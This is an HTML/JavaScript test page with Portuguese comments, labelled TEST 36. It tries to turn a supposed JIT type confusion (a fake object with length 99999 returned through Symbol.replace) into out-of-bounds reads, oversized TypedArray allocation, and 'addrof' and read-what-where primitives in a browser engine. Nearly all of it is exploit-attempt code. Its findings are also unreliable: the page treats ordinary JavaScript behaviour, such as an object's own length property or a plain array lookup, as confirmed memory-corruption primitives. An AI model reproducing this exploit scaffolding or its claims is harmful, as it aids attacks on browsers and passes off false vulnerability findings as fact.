<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>TEST 36 - strLen=99999 JIT: Usar Como Operando</title></head>
<body>
<h2>TEST 36 — strLen JIT Retornou 99999: Usar o Valor Falso Como Operando</h2>

<p><b>Achado (TEST 32-B):</b> função JIT aquecida com string real retornou <code>99999</code>
ao receber o objeto-falso. Motor não revalidou o tipo do retorno de
<code>Symbol.replace</code> — o <code>.length</code> do objeto foi lido como comprimento de string.</p>

<p><b>O que exploramos aqui:</b></p>
<ul>
  <li><b>36-A</b> Encadear: <code>new Array(strLen(fakeStr))</code> — alocar array com tamanho falso via JIT</li>
  <li><b>36-B</b> Encadear: <code>str.substring(0, strLen(fakeStr))</code> — substring com comprimento falso → OOB read de string</li>
  <li><b>36-C</b> Encadear: <code>new Float64Array(strLen(fakeStr))</code> — alocar TypedArray gigante via length JIT</li>
  <li><b>36-D</b> Primitivo addrof via charCodeAt: usar o <code>114</code> como offset para outros reads</li>
</ul>

<pre id="log">Pronto. Execute A → B → C → D em ordem.</pre>
<button onclick="runA()">36-A: ARRAY(strLen)</button>
<button onclick="runB()">36-B: SUBSTRING(strLen)</button>
<button onclick="runC()">36-C: FLOAT64ARRAY(strLen)</button>
<button onclick="runD()">36-D: CHARCODAT OFFSET</button>

<script>
var log = document.getElementById('log');
function info(m)  { log.textContent += '\n[INFO] ' + m; }
function alerta(m){ log.textContent += '\n\n⚠ ALERTA: ' + m + '\n'; }
function ok(m)    { log.textContent += '\n[OK]   ' + m; }
function sep()    { log.textContent += '\n' + '-'.repeat(60); }
function hex(v)   { return '0x' + (v >>> 0).toString(16).padStart(8,'0'); }

function forceGC() {
  var t=[]; for(var i=0;i<60000;i++) t.push({x:i}); t=null;
}

// ── Construtor do fakeString que ativa o JIT path ──────────────────────────
// Após warmup de 50k chamadas, o JIT especializa assumindo string real.
// Na chamada 50001+, Symbol.replace retorna o objeto.

var warmupDone = false;
var jitCallCount = 0;
var FAKE_LEN = 99999;

var evilPattern = {
  [Symbol.replace]: function(str) {
    jitCallCount++;
    if(jitCallCount <= 50000) {
      // Warmup: retornar string normal
      return str;
    }
    // Pós-JIT: retornar objeto com .length falso
    return {
      valueOf:  function() { return str; },
      toString: function() { return str; },
      length:   FAKE_LEN,
      0:        str[0] || 'x',
      charCodeAt: function(i) { return str.charCodeAt(i); }
    };
  }
};

function getConfused(base) {
  return base.replace(evilPattern, '');
}

function strLen(s)       { return s.length; }
function strChar(s)      { return s.charCodeAt(0); }
function strSubstr(s, n) { return s.substring(0, n); }
function strIdx(s, i)    { return s[i]; }

function doWarmup() {
  if(warmupDone) return;
  info('Aquecendo JIT (50k chamadas)...');
  var base = 'hello world test string 12345';
  for(var i = 0; i < 50001; i++) {
    strLen(getConfused(base));
    strChar(getConfused(base));
  }
  warmupDone = true;
  info('Warmup completo. jitCallCount=' + jitCallCount);
}

// ─── 36-A ────────────────────────────────────────────────────────────────────
function runA() {
  log.textContent = '[TEST 36-A] new Array(strLen(confused))...\n';
  sep();
  doWarmup();

  var base = 'probe_target_string';
  var confused = getConfused(base);
  var fakeLength = strLen(confused);

  info('confused.length (raw): ' + confused.length);
  info('strLen(confused) via JIT: ' + fakeLength);

  if(fakeLength !== FAKE_LEN) {
    info('JIT nao retornou FAKE_LEN neste run. Valor: ' + fakeLength + '. Tente novamente.');
    return;
  }

  alerta('strLen JIT = ' + fakeLength + ' CONFIRMADO. Usando como argumento de alocacao...');

  // Teste 1: new Array(fakeLength)
  try {
    var arr = new Array(fakeLength);
    info('new Array(' + fakeLength + '): length=' + arr.length + ' | typeof=' + typeof arr);
    if(arr.length === fakeLength) {
      alerta('new Array(' + fakeLength + ') ALOCADO: length=' + arr.length + ' — JIT passou o valor falso direto para o alocador!');
      // Verificar se é um array real de 99999 slots
      arr[0] = 0xDEAD;
      arr[fakeLength - 1] = 0xBEEF;
      info('arr[0]=' + hex(arr[0]) + ' arr[' + (fakeLength-1) + ']=' + hex(arr[fakeLength-1]));
    }
  } catch(e) {
    alerta('EXCECAO em new Array(' + fakeLength + '): ' + e.message);
  }

  // Teste 2: Array.from({length: fakeLength})
  try {
    var fromArr = Array.from({length: fakeLength});
    info('Array.from({length:' + fakeLength + '}): length=' + fromArr.length);
    if(fromArr.length === fakeLength) {
      alerta('Array.from COM FAKE LENGTH ALOCADO: ' + fromArr.length + ' slots!');
    }
  } catch(e) {
    alerta('EXCECAO em Array.from({length: ' + fakeLength + '}): ' + e.message);
  }

  // Teste 3: [...new Array(fakeLength)] — spread do array alocado
  try {
    var spreadArr = [].concat(Array.from({length: Math.min(fakeLength, 1000000)}));
    info('concat/spread do array falso: length=' + spreadArr.length);
  } catch(e) {
    alerta('EXCECAO no spread: ' + e.message);
  }

  // Teste 4: strLen como índice direto
  try {
    var targetStr = 'ABCDEFGHIJ'; // 10 chars reais
    var oobIdx    = fakeLength;  // 99999 — muito além do comprimento
    var oobChar   = targetStr[oobIdx];
    info('targetStr[' + oobIdx + '] = ' + JSON.stringify(oobChar));
    if(oobChar !== undefined) {
      alerta('ACESSO OOB: targetStr[' + oobIdx + '] = "' + oobChar + '" — índice 99999 em string de 10 chars retornou valor!');
    }
  } catch(e) {
    alerta('EXCECAO no acesso OOB: ' + e.message);
  }
}

// ─── 36-B ────────────────────────────────────────────────────────────────────
function runB() {
  log.textContent = '[TEST 36-B] str.substring(0, strLen(confused)) — OOB read de string...\n';
  sep();
  doWarmup();

  var base = 'abcdefghij'; // 10 chars
  var confused = getConfused(base);
  var fakeLength = strLen(confused);

  info('base.length: ' + base.length);
  info('strLen(confused): ' + fakeLength);

  if(fakeLength < 1000) {
    info('Valor nao e fake. Tente novamente ou execute 36-A antes.');
    return;
  }

  alerta('Usando ' + fakeLength + ' como end em substring...');

  // Técnica: fazer o JIT computar o substring usando o fakeLength
  // Se o motor usa o valor 99999 sem checar contra o comprimento real da string alvo,
  // substring pode tentar ler muito além dos limites da string
  function jitSubstring(s, len) {
    // Função aquecida — JIT assume len é um número válido baseado no .length da string s
    return s.substring(0, len);
  }

  // Warmup com valores válidos
  var warmStr = 'warmup_string_test_12345678';
  for(var w = 0; w < 50000; w++) {
    jitSubstring(warmStr, warmStr.length);
  }
  info('jitSubstring warmup completo.');

  // Agora passar a string REAL com o fakeLength como end
  try {
    var result = jitSubstring(base, fakeLength);
    info('jitSubstring(base[10], 99999): length=' + result.length + ' | "' + result.slice(0, 30) + '"');

    if(result.length > base.length) {
      alerta('SUBSTRING ALEM DO COMPRIMENTO REAL: retornou ' + result.length + ' chars de string de ' + base.length + ' — OOB read de string!');
      info('Conteudo extra: "' + result.slice(base.length, base.length + 100) + '"');

      // Verificar se o conteúdo extra tem padrão (bits de heap)
      var extraChars = [];
      for(var i = base.length; i < Math.min(result.length, base.length + 50); i++) {
        extraChars.push(hex(result.charCodeAt(i)));
      }
      alerta('Bytes alem do fim: ' + extraChars.join(' ') + ' — possivel conteudo de heap!');
    } else {
      ok('substring respeitou o comprimento real: ' + result.length + ' chars');
    }
  } catch(e) {
    alerta('EXCECAO em jitSubstring(base, 99999): ' + e.message);
  }

  // Variante: usar a string confundida como alvo do substring
  try {
    var r2 = jitSubstring(confused, FAKE_LEN);
    info('jitSubstring(confused, FAKE_LEN): length=' + r2.length + ' | "' + r2.toString().slice(0,30) + '"');
    if(r2 && r2.length > 10) {
      alerta('substring DO OBJETO COM FAKE_LEN COMO END retornou ' + r2.length + ' chars!');
    }
  } catch(e) {
    alerta('EXCECAO jitSubstring(confused, FAKE_LEN): ' + e.message);
  }

  // Encadear: substring do confused para extrair "chars" além do objeto
  try {
    var r3 = String.prototype.substring.call(confused, 0, 50);
    info('String.prototype.substring.call(confused, 0, 50): "' + r3 + '" length=' + r3.length);
    if(r3.length > 3) { // o objeto só tem [0,1,2] definidos
      alerta('substring.call(confused) retornou ' + r3.length + ' chars além das 3 propriedades do objeto!');
    }
  } catch(e) {
    alerta('EXCECAO substring.call(confused): ' + e.message);
  }
}

// ─── 36-C ────────────────────────────────────────────────────────────────────
function runC() {
  log.textContent = '[TEST 36-C] new Float64Array(strLen(confused)) — alocar TypedArray via fake length...\n';
  sep();
  doWarmup();

  var base = 'typedarray_size_target';
  var confused = getConfused(base);
  var fakeLength = strLen(confused);

  info('strLen(confused): ' + fakeLength);

  if(fakeLength < 1000) {
    info('Valor nao e fake. Tente novamente.');
    return;
  }

  alerta('Alocando TypedArrays com size=' + fakeLength + '...');

  // Float64Array(99999) = 99999 * 8 = ~800KB
  try {
    var f64 = new Float64Array(fakeLength);
    info('new Float64Array(' + fakeLength + '): length=' + f64.length + ' byteLength=' + f64.byteLength);
    if(f64.length === fakeLength) {
      alerta('Float64Array ALOCADO COM FAKE LENGTH: ' + f64.length + ' elementos (' + f64.byteLength + ' bytes)!');

      // Verificar se podemos escrever e ler consistentemente
      f64[0] = 1.337;
      f64[fakeLength - 1] = 9.999;
      info('f64[0]=' + f64[0] + ' f64[' + (fakeLength-1) + ']=' + f64[fakeLength-1]);

      // Tentar ler além do comprimento alocado
      try {
        var oob = f64[fakeLength];
        info('f64[' + fakeLength + '] (OOB): ' + oob);
        if(oob !== undefined) {
          alerta('LEITURA OOB ALEM DO TypedArray: f64[' + fakeLength + ']=' + oob + '!');
        }
      } catch(e2) {
        info('f64[fakeLength] lançou: ' + e2.message);
      }
    }
  } catch(e) {
    alerta('EXCECAO em new Float64Array(' + fakeLength + '): ' + e.message);
  }

  // Uint8Array(99999)
  try {
    var u8 = new Uint8Array(fakeLength);
    info('new Uint8Array(' + fakeLength + '): length=' + u8.length);
    if(u8.length === fakeLength) {
      alerta('Uint8Array(' + fakeLength + ') ALOCADO! Usando para spray...');

      // Preencher com padrão sentinela
      for(var i = 0; i < u8.length; i++) u8[i] = 0x41; // 'A'
      info('u8 preenchido com 0x41. u8[0]=' + u8[0] + ' u8[' + (fakeLength-1) + ']=' + u8[fakeLength-1]);

      // Verificar conteúdo além do fim
      forceGC();
      info('u8[fakeLength-1] pós-GC: ' + u8[fakeLength-1]);
      if(u8[fakeLength-1] !== 0x41) {
        alerta('VALOR CORROMPIDO pós-GC: u8[' + (fakeLength-1) + ']=' + u8[fakeLength-1] + ' (esperado 0x41)!');
      }
    }
  } catch(e) {
    alerta('EXCECAO em new Uint8Array(' + fakeLength + '): ' + e.message);
  }

  // Tentar ArrayBuffer(strLen * 8) — o dobro do size do TypedArray
  try {
    var bigSize = fakeLength * 8; // 99999 * 8 = ~800KB como ArrayBuffer
    var buf = new ArrayBuffer(bigSize);
    info('new ArrayBuffer(' + bigSize + '): byteLength=' + buf.byteLength);
    if(buf.byteLength === bigSize) {
      alerta('ArrayBuffer(' + bigSize + ') ALOCADO via fake length * 8: ' + buf.byteLength + ' bytes!');
    }
  } catch(e) {
    alerta('EXCECAO em new ArrayBuffer(' + fakeLength * 8 + '): ' + e.message);
  }
}

// ─── 36-D ────────────────────────────────────────────────────────────────────
function runD() {
  log.textContent = '[TEST 36-D] charCodeAt=114 como offset: usar o valor retornado para outros reads...\n';
  sep();
  doWarmup();

  // charCodeAt(fakeString) retornou 114 = 'r' (confirmado em TEST 32-B)
  // Isso significa que o motor chamou charCodeAt no objeto e usou o
  // charCode do valor toString() do objeto.
  // Vamos explorar se podemos controlar o retorno de charCodeAt via valueOf/toString
  // e usar esse valor como índice em outra operação.

  var controlledCharCode = 0;

  var controlledObj = {
    valueOf:     function() { return 'CONTROLLED'; },
    toString:    function() { return String.fromCharCode(controlledCharCode); },
    length:      FAKE_LEN,
    charCodeAt:  String.prototype.charCodeAt,
    0: String.fromCharCode(controlledCharCode)
  };

  function jitCharCode(s) { return s.charCodeAt(0); }
  function jitLen(s)      { return s.length; }

  // Warm up com string real
  var ws = 'warmup_str_for_charcode';
  for(var w = 0; w < 50000; w++) {
    jitCharCode(ws);
    jitLen(ws);
  }
  info('Warmup completo.');
  sep();

  // Testar diferentes valores controlados de charCode
  var targets = [0, 1, 65, 114, 255, 0x100, 0xFFFF];
  targets.forEach(function(code) {
    controlledCharCode = code;
    controlledObj[0] = String.fromCharCode(code);
    controlledObj.toString = function() { return String.fromCharCode(controlledCharCode); };

    try {
      var result = jitCharCode(controlledObj);
      info('controlledCharCode=' + code + ' → jitCharCode=' + result);
      if(result === code) {
        alerta('CHARCODAT CONTROLADO: código ' + code + ' injetado via objeto e retornado pela JIT! Podemos controlar o valor retornado por charCodeAt.');
      } else if(result !== 0 && !isNaN(result)) {
        info('charCode retornou valor diferente: ' + result + ' (esperado ' + code + ')');
      }
    } catch(e) {
      info('charCode(' + code + ') lançou: ' + e.message);
    }
  });

  sep();
  info('Encadeando: usar charCode como índice em um array controlado...');

  // Se conseguimos controlar o charCode retornado, usá-lo como índice
  // em um array com dados conhecidos → read-what-where controlado
  var indexedData = new Float64Array(256);
  for(var i = 0; i < 256; i++) indexedData[i] = i * 1.111; // valor único por índice

  var DESIRED_INDEX = 42;
  controlledCharCode = DESIRED_INDEX;
  controlledObj[0] = String.fromCharCode(DESIRED_INDEX);

  try {
    var idx = jitCharCode(controlledObj);
    info('jitCharCode retornou: ' + idx + ' (queremos: ' + DESIRED_INDEX + ')');
    if(idx >= 0 && idx < 256) {
      var readValue = indexedData[idx];
      info('indexedData[' + idx + '] = ' + readValue + ' (esperado ' + (DESIRED_INDEX * 1.111).toFixed(3) + ')');
      if(Math.abs(readValue - DESIRED_INDEX * 1.111) < 0.001) {
        alerta('READ-WHAT-WHERE CONTROLADO: charCode=' + DESIRED_INDEX + ' usou como índice → leu indexedData[' + idx + ']=' + readValue + '! Primitivo de leitura controlada confirmado!');
      }
    }
  } catch(e) {
    alerta('EXCECAO no encadeamento charCode→index: ' + e.message);
  }
}
</script>
</body>
</html>
